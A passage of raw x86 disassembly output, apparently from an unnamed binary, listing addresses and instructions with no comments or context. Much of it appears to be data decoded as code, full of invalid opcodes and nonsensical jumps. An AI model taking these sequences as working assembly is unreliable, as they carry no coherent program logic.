  41d528:	sbb    ecx,ebp
  41d52a:	push   eax
  41d52b:	pop    es
  41d52c:	es pop es
  41d52e:	add    BYTE PTR [eax],al
  41d530:	aam    0xd2
  41d532:	inc    ecx
  41d533:	add    BYTE PTR [ebx],bl
  41d535:	or     eax,DWORD PTR [esi+ecx*1]
	...
  41d568:	mov    WORD PTR [eax],ss
  41d56a:	inc    edx
  41d56b:	add    BYTE PTR [esi+0x67f89c85],dh
  41d571:	pushw  0x68
  41d574:	addr16 push 0x67
  41d577:	pushw  0x6b6a
  41d57b:	push   0x676b67
	...
  41d588:	es aas 
  41d58a:	inc    eax
  41d58b:	add    BYTE PTR [ebp-0x5db060b1],ah
  41d591:	dec    edi
  41d592:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d593:	dec    edi
  41d594:	lahf   
  41d595:	dec    edi
  41d596:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d597:	dec    edi
  41d598:	ins    DWORD PTR es:[edi],dx
  41d599:	dec    esi
  41d59a:	bound  ecx,QWORD PTR [esi+0x30]
  41d59d:	dec    esi
  41d59e:	add    BYTE PTR [eax],al
  41d5a0:	cdq    
  41d5a1:	dec    edi
  41d5a2:	pushf  
  41d5a3:	dec    edi
  41d5a4:	fwait
  41d5a5:	dec    edi
  41d5a6:	ins    DWORD PTR es:[edi],dx
  41d5a7:	dec    esi
  41d5a8:	bound  ecx,QWORD PTR [esi+0x30]
  41d5ab:	dec    esi
  41d5ac:	scas   eax,DWORD PTR es:[edi]
  41d5ad:	dec    edi
  41d5ae:	lods   eax,DWORD PTR ds:[esi]
  41d5af:	dec    edi
  41d5b0:	lahf   
  41d5b1:	dec    edi
  41d5b2:	mov    ds:0x624e6d4f,al
  41d5b7:	dec    esi
  41d5b8:	xor    BYTE PTR [esi+0x0],cl
  41d5bb:	add    BYTE PTR [ebp-0x5bb067b1],ch
  41d5c1:	dec    edi
  41d5c2:	test   eax,0xa04f934f
  41d5c7:	dec    edi
  41d5c8:	fwait
  41d5c9:	dec    edi
  41d5ca:	xor    BYTE PTR [esi+0x0],cl
  41d5cd:	add    BYTE PTR [eax],al
  41d5cf:	add    BYTE PTR [eax],al
  41d5d1:	add    BYTE PTR [eax],al
  41d5d3:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  41d5da:	mov    WORD PTR [ebp-0x32734274],gs
  41d5e0:	mov    ebp,ds
  41d5e2:	mov    ebp,gs
  41d5e4:	mov    ebp,?
  41d5e6:	mov    WORD PTR ds:0x2d8c1d8c,cs
  41d5ec:	mov    WORD PTR ds:0x6d8c5d8c,?
  41d5f2:	mov    WORD PTR [edx-0x74],?
  41d5f5:	jae    0x41d583
  41d5f7:	jo     0x41d585
  41d5f9:	jno    0x41d587
  41d5fb:	jbe    0x41d589
  41d5fd:	ja     0x41d58b
  41d5ff:	je     0x41d58d
  41d601:	jne    0x41d58f
  41d603:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  41d60a:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  41d610:	lods   al,BYTE PTR ds:[esi]
  41d611:	jge    0x41d5cf
  41d613:	jge    0x41d5b3
  41d615:	(bad)  
  41d616:	jns    0x41d68b
  41d618:	mov    ecx,0x7d738cb1
  41d61d:	ins    DWORD PTR es:[edi],dx
  41d61e:	enter  0x9fc6,0x26
  41d622:	jb     0x41d627
  41d624:	test   eax,0xb956bb17
  41d629:	hlt    
  41d62a:	test   al,0x37
  41d62c:	test   al,0x7e
  41d62e:	fnstenv [ecx-0x6a]
  41d631:	mov    cl,0x6a
  41d633:	push   0xffffffce
  41d635:	or     BYTE PTR [edx],bl
  41d637:	xlat   BYTE PTR ds:[ebx]
  41d638:	out    dx,eax
  41d639:	add    eax,0x9321d7aa
  41d63e:	scas   al,BYTE PTR es:[edi]
  41d63f:	adc    DWORD PTR [esi],esp
  41d641:	jge    0x41d666
  41d643:	fidiv  WORD PTR [edi]
  41d645:	leave  
  41d646:	hlt    
  41d647:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d648:	cmp    ax,0x1fc8
  41d64c:	mov    dh,cl
  41d64e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d64f:	(bad)  
  41d650:	and    DWORD PTR [eax],ebx
  41d652:	and    DWORD PTR [ecx-0x18],esi
  41d655:	(bad)  [ebx+0x7]
  41d658:	cmc    
  41d659:	enter  0x301a,0x40
  41d65d:	adc    BYTE PTR [edx+0x0],al
  41d660:	jno    0x41d6c8
  41d662:	jp     0x41d6d2
  41d664:	enter  0x41d4,0x0
  41d668:	sub    al,0xd5
  41d66a:	inc    ecx
  41d66b:	add    BYTE PTR [eax],cl
  41d66d:	in     eax,dx
  41d66e:	adc    al,BYTE PTR [edi]
  41d670:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  41d677:	ins    BYTE PTR es:[edi],dx
  41d678:	push   0x49657557
  41d67d:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  41d683:	push   edi
  41d684:	ins    BYTE PTR es:[edi],dx
  41d685:	inc    edx
  41d686:	push   0x76666a73
  41d68b:	inc    edx
  41d68c:	jo     0x41d6d7
  41d68e:	dec    ebp
  41d68f:	dec    ebp
  41d690:	pop    edx
  41d691:	jp     0x41d6ed
  41d693:	jbe    0x41d6db
  41d695:	pop    ecx
  41d696:	jo     0x41d710
	...
  41d6ac:	inc    ebp
  41d6ad:	push   edx
  41d6ae:	jb     0x41d724
  41d6b0:	inc    esi
  41d6b1:	je     0x41d6f4
  41d6b3:	inc    esi
  41d6b4:	jae    0x41d72c
  41d6b6:	dec    ebx
  41d6b7:	gs inc edx
  41d6b9:	inc    bx
  41d6bb:	push   ebp
  41d6bc:	jno    0x41d734
  41d6be:	ja     0x41d727
  41d6c0:	dec    edi
  41d6c1:	dec    esp
  41d6c2:	dec    ebp
  41d6c3:	inc    edx
  41d6c4:	jno    0x41d737
  41d6c6:	jae    0x41d71b
  41d6c8:	dec    eax
  41d6c9:	inc    ebp
  41d6ca:	inc    esp
  41d6cb:	inc    esp
  41d6cc:	push   ecx
  41d6cd:	dec    edx
  41d6ce:	ins    BYTE PTR es:[edi],dx
  41d6cf:	dec    ebx
  41d6d0:	jbe    0x41d740
  41d6d2:	pop    eax
  41d6d3:	jbe    0x41d720
  41d6d5:	inc    ecx
  41d6d6:	fs gs jno 0x41d747
  41d6da:	push   ebx
  41d6db:	inc    ecx
  41d6dc:	add    BYTE PTR [eax],al
  41d6de:	inc    ebx
  41d6df:	outs   dx,BYTE PTR ds:[esi]
  41d6e0:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  41d6e4:	push   edx
  41d6e5:	push   ecx
  41d6e6:	push   0x74000064
  41d6eb:	jne    0x41d762
  41d6ed:	ins    DWORD PTR es:[edi],dx
  41d6ee:	push   ecx
  41d6ef:	push   eax
  41d6f0:	jo     0x41d76c
  41d6f2:	addr16 jo 0x41d74b
  41d6f5:	pop    eax
  41d6f6:	add    BYTE PTR [eax],al
  41d6f8:	push   ecx
  41d6f9:	pop    ecx
  41d6fa:	inc    ebx
  41d6fb:	inc    edx
  41d6fc:	outs   dx,BYTE PTR ds:[esi]
  41d6fd:	popa   
  41d6fe:	imul   eax,DWORD PTR [edx+0x61],0x6b
  41d702:	jne    0x41d772
  41d704:	dec    ebx
  41d705:	add    BYTE PTR [ecx+0x45],bh
  41d708:	bound  ebp,QWORD PTR [ecx+0x46]
  41d70b:	dec    ecx
  41d70c:	ja     0x41d753
  41d70e:	dec    eax
  41d70f:	inc    ebp
  41d710:	inc    edx
  41d711:	push   ebx
  41d712:	add    BYTE PTR [eax],al
  41d714:	je     0x41d779
  41d716:	bound  esp,QWORD PTR [edi+0x78]
  41d719:	dec    eax
  41d71a:	bound  edx,QWORD PTR [ebx+0x43]
  41d71d:	pop    eax
  41d71e:	outs   dx,DWORD PTR ds:[esi]
  41d71f:	push   0x4355
  41d724:	inc    edi
  41d725:	gs ins BYTE PTR es:[edi],dx
  41d727:	dec    esp
  41d728:	js     0x41d792
  41d72a:	inc    edx
  41d72b:	js     0x41d773
  41d72d:	arpl   WORD PTR [eax],ax
  41d72f:	add    BYTE PTR [eax],al
  41d731:	add    BYTE PTR [eax],al
  41d733:	add    BYTE PTR [edx+0x70],cl
  41d736:	jb     0x41d7b0
  41d738:	outs   dx,DWORD PTR ds:[esi]
  41d739:	pop    eax
  41d73a:	dec    ebx
  41d73b:	push   esp
  41d73c:	dec    esp
  41d73d:	jns    0x41d78a
  41d73f:	js     0x41d7b9
  41d741:	outs   dx,BYTE PTR ds:[esi]
  41d742:	pop    ecx
  41d743:	jae    0x41d7b3
  41d745:	push   0x43644448
  41d74a:	arpl   WORD PTR [edx+0x55],sp
  41d74d:	push   0x42504e67
  41d752:	push   ebp
  41d753:	je     0x41d7ca
  41d755:	addr16 dec edi
  41d757:	dec    esp
  41d758:	inc    edx
  41d759:	ins    DWORD PTR es:[edi],dx
  41d75a:	inc    esi
  41d75b:	inc    esi
  41d75c:	inc    esi
  41d75d:	arpl   WORD PTR [edx+0x47],bx
  41d760:	push   ebp
  41d761:	inc    ebx
  41d762:	popa   
  41d763:	push   edx
  41d764:	dec    esp
  41d765:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  41d76c:	push   ecx
  41d76d:	push   ebx
  41d76e:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  41d775:	dec    edx
  41d776:	jns    0x41d7e1
  41d778:	push   edx
  41d779:	inc    ebx
  41d77a:	jo     0x41d7f1
  41d77c:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  41d780:	fs push ebx
  41d782:	inc    ebx
  41d783:	push   ebp
  41d784:	push   eax
  41d785:	ja     0x41d801
  41d787:	jp     0x41d7d6
  41d789:	push   esi
  41d78a:	arpl   WORD PTR gs:[ecx+0x45],si
  41d78e:	dec    edx
  41d78f:	dec    esi
  41d790:	data16 ja 0x41d7e1
  41d793:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
  41d79a:	dec    esp
  41d79b:	cmp    ebx,ebp
  41d79d:	dec    esp
  41d79e:	lods   eax,DWORD PTR ds:[esi]
  41d79f:	out    dx,al
  41d7a0:	mov    ebp,0xa53ddffb
  41d7a5:	js     0x41d760
  41d7a7:	je     0x41d756
  41d7a9:	pop    esi
  41d7aa:	out    dx,al
  41d7ab:	dec    ecx
  41d7ac:	xchg   esi,eax
  41d7ad:	add    DWORD PTR [eax],eax
  41d7af:	stos   BYTE PTR es:[edi],al
  41d7b0:	add    BYTE PTR [eax],al
  41d7b2:	add    BYTE PTR [eax],dl
  41d7b4:	popa   
  41d7b5:	loopne 0x41d80a
  41d7b7:	xor    BYTE PTR [ebx-0xd],ch
  41d7ba:	retf   
  41d7bb:	loopne 0x41d79f
  41d7bd:	popf   
  41d7be:	repnz mov bl,BYTE PTR [ebp-0x44]
  41d7c2:	ror    BYTE PTR [eax+edx*2+0x60],0xcc
  41d7c7:	push   ebx
  41d7c8:	pop    esp
  41d7c9:	into   
  41d7ca:	sub    BYTE PTR [esi-0x70],0x5c
  41d7ce:	popf   
  41d7cf:	pop    es
  41d7d0:	sbb    DWORD PTR [esi+0x79],0xfffffff6
  41d7d4:	imul   eax,DWORD PTR [esi+0x48],0xfffffff7
  41d7d8:	ins    DWORD PTR es:[edi],dx
  41d7d9:	les    ebp,FWORD PTR [ecx+0x1cf19a28]
  41d7df:	sbb    esi,esp
  41d7e1:	test   DWORD PTR [edi+0x38d6682],edi
  41d7e7:	push   eax
  41d7e8:	in     eax,dx
  41d7e9:	inc    esi
  41d7ea:	fs push ecx
  41d7ec:	dec    ebx
  41d7ed:	mov    bh,0x90
  41d7ef:	ins    DWORD PTR es:[edi],dx
  41d7f0:	cmp    ch,bh
  41d7f2:	sbb    ebx,DWORD PTR ds:0x63fbabd7
  41d7f8:	jb     0x41d7a9
  41d7fa:	ret    
  41d7fb:	clc    
  41d7fc:	mov    eax,ds:0x9badb91
  41d801:	mov    edi,0x7404a252
  41d806:	mov    bl,0x62
  41d808:	cwde   
  41d809:	pop    ecx
  41d80a:	jmp    0x50e4:0xac2c5c8e
  41d811:	mov    al,bh
  41d813:	ret    0x7e92
  41d816:	sub    al,0xae
  41d818:	and    eax,0x2454d05b
  41d81d:	jmp    0x41d82b
  41d81f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d820:	jo     0x41d81b
  41d822:	cmp    BYTE PTR [eax+eiz*4+0xa],dh
  41d826:	in     al,dx
  41d827:	inc    edi
  41d828:	pop    ds
  41d829:	pop    ss
  41d82a:	mov    al,ds:0x87a3d167
  41d82f:	call   0x998d:0x7d143d33
  41d836:	repz mov edi,0x1e5226
  41d83c:	inc    edi
  41d83d:	ror    BYTE PTR [ebx],cl
  41d83f:	outs   dx,DWORD PTR ds:[esi]
  41d840:	push   esp
  41d841:	push   cs
  41d842:	sbb    eax,0xac7b6254
  41d847:	and    eax,0x2af17be0
  41d84c:	out    dx,eax
  41d84d:	inc    edi
  41d84e:	mov    eax,0x677789e
  41d853:	dec    edi
  41d854:	push   cs
  41d855:	pop    ds
  41d856:	in     eax,dx
  41d857:	adc    al,0x62
  41d859:	stc    
  41d85a:	ror    BYTE PTR [ecx+0x72],0x0
	...
  41d86a:	add    BYTE PTR [eax],ch
  41d86c:	mov    dl,0xa5
  41d86e:	push   edx
  41d86f:	mov    edi,0x7cfaff57
  41d874:	xlat   BYTE PTR fs:[ebx]
  41d876:	push   esi
  41d877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d878:	push   ebp
  41d879:	add    dl,BYTE PTR [ebp-0xd]
  41d87c:	xchg   esi,eax
  41d87d:	add    DWORD PTR [eax],eax
  41d87f:	stos   BYTE PTR es:[edi],al
  41d880:	add    BYTE PTR [eax],al
  41d882:	add    ah,ah
  41d884:	sub    BYTE PTR [ebx-0x61],bh
  41d887:	shl    DWORD PTR [edx*2-0x4c997ea9],1
  41d88e:	lea    edi,[ecx+ebx*1+0x30da1b8b]
  41d895:	pop    eax
  41d896:	fisttp QWORD PTR [edx+0x42696486]
  41d89c:	inc    eax
  41d89d:	xchg   edi,eax
  41d89e:	inc    eax
  41d89f:	(bad)  
  41d8a0:	pop    ebx
  41d8a1:	mov    al,0x3b
  41d8a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8a4:	push   esi
  41d8a5:	xchg   BYTE PTR [esi+eax*8-0x5e018aee],ah
  41d8ac:	pop    ecx
  41d8ad:	pop    eax
  41d8ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8af:	cmp    ebx,ebx
  41d8b1:	or     esp,DWORD PTR [esp+ebp*8-0x668d8e82]
  41d8b8:	mov    cs,WORD PTR [edx-0x1531b298]
  41d8be:	inc    edi
  41d8bf:	imul   ecx
  41d8c1:	imul   ecx,esi,0x45d8fc7f
  41d8c7:	add    ah,BYTE PTR [ecx+ebp*2+0x59]
  41d8cb:	lods   al,BYTE PTR ds:[esi]
  41d8cc:	mov    DWORD PTR [eax],0xe599d7a9
  41d8d2:	hlt    
  41d8d3:	sar    WORD PTR [edx+ebp*4-0x17],1
  41d8d8:	scas   eax,DWORD PTR es:[edi]
  41d8d9:	in     eax,0xd1
  41d8db:	mov    eax,ds:0xf7b21010
  41d8e0:	icebp  
  41d8e1:	jo     0x41d872
  41d8e3:	retf   
  41d8e4:	inc    esp
  41d8e5:	jmp    0xc36e12ac
  41d8ea:	mov    edx,0xb4dfa474
  41d8ef:	jmp    0x46487d2d
  41d8f4:	pop    esi
  41d8f5:	mov    BYTE PTR [esi-0x59cf7682],bl
  41d8fb:	mov    WORD PTR [edi-0x2facf33f],fs
  41d901:	xchg   edx,eax
  41d902:	call   0xcd26b25a
  41d907:	shl    DWORD PTR [esi+0x28],1
  41d90a:	jo     0x41d912
  41d90c:	jmp    0x7f9:0xe852c95c
  41d913:	fst    st(2)
  41d915:	lds    ebx,FWORD PTR [ebp-0x1c8cb8c9]
  41d91b:	cmp    BYTE PTR [ecx+0x3d],dh
  41d91e:	sahf   
  41d91f:	iret   
  41d920:	inc    edi
  41d921:	retf   0xefdf
  41d924:	das    
  41d925:	out    0x5,eax
  41d927:	ret    0x74f2
  41d92a:	pop    eax
  41d92b:	pop    eax
  41d92c:	push   edx
	...
  41d939:	add    BYTE PTR [eax],al
  41d93b:	mov    bl,0x55
  41d93d:	jg     0x41d8c0
  41d93f:	jmp    FWORD PTR [ebx-0x69418801]
  41d945:	push   0xdc07c557
  41d94a:	sbb    DWORD PTR [ebp-0x55fffe69],ebx
  41d950:	add    BYTE PTR [eax],al
  41d952:	add    BYTE PTR [ebx],ch
  41d954:	cld    
  41d955:	mov    ebp,0xf1092665
  41d95a:	or     DWORD PTR ds:0x83e5491e,0x31
  41d961:	iret   
  41d962:	dec    ebx
  41d963:	in     al,0x90
  41d965:	out    0x9f,al
  41d967:	cmp    DWORD PTR [ecx-0x76],esi
  41d96a:	adc    eax,0xec226584
  41d96f:	xor    ebp,DWORD PTR [edx+0x12]
  41d972:	mov    edx,0xa904604
  41d977:	mov    edx,0x29e7d0de
  41d97c:	pop    edi
  41d97d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d97e:	add    dh,dh
  41d980:	sub    eax,0x88a62e94
  41d985:	or     ecx,DWORD PTR [ecx+ecx*4-0x22]
  41d989:	(bad)  
  41d98a:	ins    DWORD PTR es:[edi],dx
  41d98b:	xor    bh,BYTE PTR gs:[eax-0x1dbef694]
  41d992:	ret    
  41d993:	mov    ss,WORD PTR [edx]
  41d995:	clc    
  41d996:	mov    ch,0x1
  41d998:	lods   al,BYTE PTR ds:[esi]
  41d999:	sbb    al,0xc5
  41d99b:	mov    DWORD PTR [ebp+0x5],esp
  41d99e:	add    eax,0x831bba5a
  41d9a3:	or     esi,DWORD PTR [ebp-0x1e8864c5]
  41d9a9:	(bad)  
  41d9ab:	pusha  
  41d9ac:	mov    dl,0x4e
  41d9ae:	popf   
  41d9af:	fmul   st,st(7)
  41d9b1:	sbb    ch,ch
  41d9b3:	dec    ebp
  41d9b4:	(bad)  
  41d9b5:	mov    esi,0x745e7df4
  41d9ba:	stos   DWORD PTR es:[edi],eax
  41d9bb:	in     al,dx
  41d9bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9bd:	enter  0xaefc,0x75
  41d9c1:	pushf  
  41d9c2:	xor    al,0x25
  41d9c4:	sub    ah,al
  41d9c6:	sbb    edi,ecx
  41d9c8:	aad    0xd8
  41d9ca:	iret   
  41d9cb:	mov    bh,0xce
  41d9cd:	push   0x848f6f2d
  41d9d2:	mov    edx,0xfa33f7a5
  41d9d7:	ss xchg esp,eax
  41d9d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9da:	mov    bh,0xb
  41d9dc:	loop   0x41d9dd
  41d9de:	ds inc ebp
  41d9e0:	ret    
  41d9e1:	fistp  QWORD PTR [esi-0x5a]
  41d9e4:	xchg   esp,eax
  41d9e5:	xchg   ecx,eax
  41d9e6:	pop    ss
  41d9e7:	jnp    0x41d971
  41d9e9:	addr16 repz and eax,0x563179bd
  41d9f0:	mov    esi,0x5b1942c3
  41d9f5:	dec    esp
  41d9f6:	mov    WORD PTR [ebx-0x1d],?
  41d9f9:	cmp    BYTE PTR [ecx+0x24],al
  41d9fc:	sub    al,BYTE PTR [eax]
	...
  41da0a:	add    BYTE PTR [eax],bh
  41da0c:	(bad)  
  41da0d:	cmp    ah,BYTE PTR [esi+edi*8]
  41da10:	in     al,dx
  41da11:	fimul  WORD PTR ds:[edi-0x7653942b]
  41da18:	push   edi
  41da19:	inc    ebp
  41da1a:	add    BYTE PTR [edi-0x68],al
  41da1d:	add    DWORD PTR [eax],eax
  41da1f:	stos   BYTE PTR es:[edi],al
  41da20:	add    BYTE PTR [eax],al
  41da22:	add    BYTE PTR [edi],dl
  41da24:	fmulp  st(5),st
  41da26:	cdq    
  41da27:	btr    DWORD PTR [esi+esi*1-0x7d],esi
  41da2c:	pop    edi
  41da2d:	inc    ebp
  41da2e:	cmp    ch,BYTE PTR [esi]
  41da30:	add    al,0x10
  41da32:	dec    esi
  41da33:	mov    bl,BYTE PTR [ebx]
  41da35:	lods   eax,DWORD PTR ds:[esi]
  41da36:	xor    eax,0xc38266e8
  41da3b:	xor    eax,0x331d3c62
  41da40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da41:	dec    edi
  41da42:	add    esi,edi
  41da44:	pop    ebx
  41da45:	mov    dh,0x2
  41da47:	and    bl,BYTE PTR [edi-0xcd1ecb7]
  41da4d:	(bad)  
  41da4e:	cwde   
  41da4f:	add    DWORD PTR [edi],edi
  41da51:	arpl   WORD PTR [edi-0x6c],si
  41da54:	mov    ch,0x80
  41da56:	push   ecx
  41da57:	inc    esi
  41da58:	pop    esi
  41da59:	imul   BYTE PTR [edx+0x5f5999b3]
  41da5f:	mov    ebp,0x185a3aa3
  41da65:	clc    
  41da66:	push   esp
  41da67:	pop    ss
  41da68:	mov    ebx,0x549dc8a
  41da6d:	adc    eax,0xcc0628ba
  41da72:	xchg   ecx,eax
  41da73:	std    
  41da74:	ins    BYTE PTR es:[edi],dx
  41da75:	xchg   esi,eax
  41da76:	sub    bh,BYTE PTR [ecx-0x4e]
  41da79:	mov    ecx,0x2231f00b
  41da7e:	ret    
  41da7f:	mov    ds:0x38de9942,al
  41da84:	ins    DWORD PTR es:[edi],dx
  41da85:	out    0xf9,al
  41da87:	ror    esi,0x3f
  41da8a:	adc    BYTE PTR [esp+ecx*4],dh
  41da8d:	adc    DWORD PTR [ecx-0x65],ecx
  41da90:	xchg   edx,eax
  41da91:	or     cl,BYTE PTR [ebx]
  41da93:	jo     0x41db0e
  41da95:	inc    ecx
  41da96:	push   ecx
  41da97:	jb     0x41da52
  41da99:	in     al,dx
  41da9a:	pop    edi
  41da9b:	xchg   ebx,eax
  41da9c:	xchg   esi,eax
  41da9d:	aaa    
  41da9e:	enter  0xf6ba,0xc
  41daa2:	xor    bl,BYTE PTR [esi]
  41daa4:	xchg   esi,eax
  41daa5:	(bad)  [ecx]
  41daa7:	push   ebp
  41daa8:	lahf   
  41daa9:	stc    
  41daaa:	mov    ebp,0xa93163d1
  41daaf:	cmp    al,0xd4
  41dab1:	call   0x4b119bc3
  41dab6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dab7:	mov    edi,0xfeaf6dd0
  41dabc:	mov    WORD PTR [ebx],ss
  41dabe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dabf:	jp     0x41daf9
  41dac1:	stos   DWORD PTR es:[edi],eax
  41dac2:	sub    esi,DWORD PTR [di-0x6b]
  41dac6:	(bad)  
  41dac7:	mov    edx,0x52673d6d
  41dacc:	repz add BYTE PTR [eax],al
	...
  41dadb:	fnstenv [esi-0x2490e49a]
  41dae1:	std    
  41dae2:	neg    BYTE PTR [esi]
  41dae4:	sub    esp,DWORD PTR [ebx-0x23]
  41dae7:	jno    0x41dab5
  41dae9:	mov    eax,ds:0x198f178
  41daee:	add    BYTE PTR [edx+0x5c000000],ch
  41daf4:	cwde   
  41daf5:	add    ebp,DWORD PTR [eax+0x3edcf553]
  41dafb:	aam    0x9e
  41dafd:	icebp  
  41dafe:	xor    ah,BYTE PTR [edx+0x5db08c68]
  41db04:	inc    edx
  41db05:	sub    esp,DWORD PTR [eax+0x6d]
  41db08:	xor    ch,al
  41db0a:	ins    BYTE PTR es:[edi],dx
  41db0b:	repz hlt 
  41db0d:	cli    
  41db0e:	popf   
  41db0f:	call   0x1a9bed2c
  41db14:	push   edi
  41db15:	ins    BYTE PTR es:[edi],dx
  41db16:	sub    eax,0xae0497
  41db1b:	mov    ecx,0xc4cf05c7
  41db20:	out    dx,al
  41db21:	jne    0x41daf8
  41db23:	xor    BYTE PTR ds:0xf242585e,bh
  41db29:	adc    DWORD PTR [eax+ebp*8-0x2e],esp
  41db2d:	test   BYTE PTR [ebx],cl
  41db2f:	xlat   BYTE PTR ds:[ebx]
  41db30:	(bad)  
  41db31:	xor    al,0xc9
  41db33:	idiv   DWORD PTR [edx]
  41db35:	mov    eax,0x2b9c0c1e
  41db3a:	sub    al,0x68
  41db3c:	in     eax,0xc6
  41db3e:	add    DWORD PTR fs:[edx],ecx
  41db41:	nop
  41db42:	mov    BYTE PTR [ecx],0xa3
  41db45:	and    al,BYTE PTR [ebp+0x677f3a6b]
  41db4b:	and    al,0x0
  41db4d:	shr    BYTE PTR [esi+0x12fede04],1
  41db53:	ror    BYTE PTR [ebx+0x30],1
  41db56:	ja     0x41db49
  41db58:	push   cs
  41db59:	sub    DWORD PTR [edx+0x2c5364cd],edx
  41db5f:	cmp    al,0xc8
  41db61:	push   cs
  41db62:	sbb    DWORD PTR [edx],ecx
  41db64:	sar    BYTE PTR [ebp-0xbde30dd],0x48
  41db6b:	sub    eax,ecx
  41db6d:	mov    ah,0xa0
  41db6f:	ja     0x41db42
  41db71:	shl    DWORD PTR [ecx+0x928d8d9],1
  41db77:	ds or  ecx,edi
  41db7a:	inc    edx
  41db7b:	push   es
  41db7c:	popf   
  41db7d:	rcl    DWORD PTR [ebx],0x30
  41db80:	mov    bl,0x95
  41db82:	sub    BYTE PTR [ecx+esi*2+0x113d20d3],dl
  41db89:	bound  esi,QWORD PTR [edx+0x53]
  41db8c:	mov    ebx,0x4839c5e
  41db91:	or     ebp,DWORD PTR ds:0xb0fb3ee0
  41db97:	lods   eax,DWORD PTR ds:[esi]
  41db98:	mov    fs,ebx
  41db9a:	dec    esi
  41db9b:	inc    edx
  41db9c:	xchg   ecx,eax
	...
  41dba9:	add    BYTE PTR [eax],al
  41dbab:	fidiv  DWORD PTR [edx]
  41dbad:	xchg   edi,eax
  41dbae:	mov    bh,bh
  41dbb0:	scas   eax,DWORD PTR es:[edi]
  41dbb1:	fbstp  TBYTE PTR [edx+0x3]
  41dbb4:	inc    ebp
  41dbb5:	mov    ds:0x1c2d695c,eax
  41dbba:	xchg   esi,eax
  41dbbb:	fwait
  41dbbc:	cdq    
  41dbbd:	add    DWORD PTR [eax],eax
  41dbbf:	stos   BYTE PTR es:[edi],al
  41dbc0:	add    BYTE PTR [eax],al
  41dbc2:	add    bh,bl
  41dbc4:	addr16 ret 0x7309
  41dbc8:	addr16 test eax,0xba11fbb4
  41dbce:	loope  0x41dbcb
  41dbd0:	ins    DWORD PTR es:[edi],dx
  41dbd1:	in     eax,dx
  41dbd2:	aad    0xb9
  41dbd4:	pop    ds
  41dbd5:	lea    edx,[eax]
  41dbd7:	jo     0x41dbbd
  41dbd9:	mov    eax,ds:0x845b4ba
  41dbde:	(bad)  
  41dbdf:	cmp    al,0x9a
  41dbe1:	fidivr DWORD PTR [edi+ecx*2-0x2e]
  41dbe5:	ins    BYTE PTR es:[edi],dx
  41dbe6:	push   cs
  41dbe7:	sub    BYTE PTR [ebp-0x63],ch
  41dbea:	xchg   esp,eax
  41dbeb:	into   
  41dbec:	pop    ds
  41dbed:	and    BYTE PTR [ebx],0x81
  41dbf0:	dec    ebp
  41dbf1:	pop    ecx
  41dbf2:	neg    BYTE PTR [edi+ecx*1]
  41dbf5:	adc    BYTE PTR [eax],bh
  41dbf7:	ror    BYTE PTR [ebp+0x36],cl
  41dbfa:	jbe    0x41dc42
  41dbfc:	or     ebp,DWORD PTR [bx+di+0x2921]
  41dc01:	(bad)  
  41dc02:	std    
  41dc03:	pop    edx
  41dc04:	imul   esi,DWORD PTR [edi+0x42],0xf1a4c5df
  41dc0b:	rcr    BYTE PTR [edi+0x3ea6b1b2],0xab
  41dc12:	(bad)
  41dc15:	rcr    esp,0x55
  41dc18:	stos   DWORD PTR es:[edi],eax
  41dc19:	push   0x9786b0b7
  41dc1e:	jns    0x41dc2f
  41dc20:	sti    
  41dc21:	mov    bl,0xf0
  41dc23:	fst    QWORD PTR [edi+0x51eb26f1]
  41dc29:	cmp    eax,0xf18cb661
  41dc2e:	ds std 
  41dc30:	out    0x31,eax
  41dc32:	and    eax,0x977046ec
  41dc37:	pop    ss
  41dc38:	adc    ah,BYTE PTR [ecx-0x298a7c46]
  41dc3e:	pop    ecx
  41dc3f:	lods   eax,DWORD PTR ds:[esi]
  41dc40:	xchg   ecx,eax
  41dc41:	dec    ecx
  41dc42:	inc    edi
  41dc43:	mov    ds,WORD PTR es:0x7196c38d
  41dc4a:	push   esi
  41dc4b:	pushf  
  41dc4c:	push   0x35
  41dc4e:	or     edi,edx
  41dc50:	outs   dx,BYTE PTR ds:[esi]
  41dc51:	sub    al,0xfd
  41dc53:	lock xor eax,0xd0626dde
  41dc59:	xor    BYTE PTR [edx],bh
  41dc5b:	mov    al,0x4c
  41dc5d:	jge    0x41dc42
  41dc5f:	in     eax,0xc1
  41dc61:	mov    eax,0x833c5329
  41dc66:	retf   
  41dc67:	rol    bh,1
  41dc69:	xor    eax,0xf48b15
	...
  41dc7a:	add    BYTE PTR [eax-0x1c],cl
  41dc7d:	add    ebx,DWORD PTR [ebx-0x8270051]
  41dc83:	pop    esi
  41dc84:	sub    BYTE PTR [eax-0x7e9fb571],bl
  41dc8a:	ins    BYTE PTR es:[edi],dx
  41dc8b:	inc    ebp
  41dc8c:	call   0x0:0xaa0001
  41dc93:	mov    ecx,0xa5c6b360
  41dc98:	sub    al,0xcd
  41dc9a:	repnz mov esp,0x4e8849d7
  41dca0:	daa    
  41dca1:	popa   
  41dca2:	push   eax
  41dca3:	push   ebx
  41dca4:	inc    edi
  41dca5:	mov    ecx,0x5351cd40
  41dcaa:	sbb    al,BYTE PTR [eax]
  41dcac:	and    dl,BYTE PTR [ebx]
  41dcae:	dec    ebp
